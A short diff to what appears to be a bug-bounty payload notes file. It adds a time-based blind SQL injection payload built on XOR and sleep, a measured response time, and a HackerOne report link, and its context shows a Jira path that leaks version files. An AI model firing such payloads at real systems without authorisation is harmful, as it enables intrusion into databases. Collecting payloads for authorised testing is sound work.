@@ -90,3 +90,11 @@ OR
 -site.atlassian.net/s/anything/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.properties
 ```
 *pom.xml or txt*
+
+📅 24-Nov-2020
+## Time Based SQL Injection
+*2,077 millis*
+``sql
+'XOR(if(now()=sysdate(),sleep(1*1),0))OR'
+```
+**[more info](https://hackerone.com/reports/1024984)**
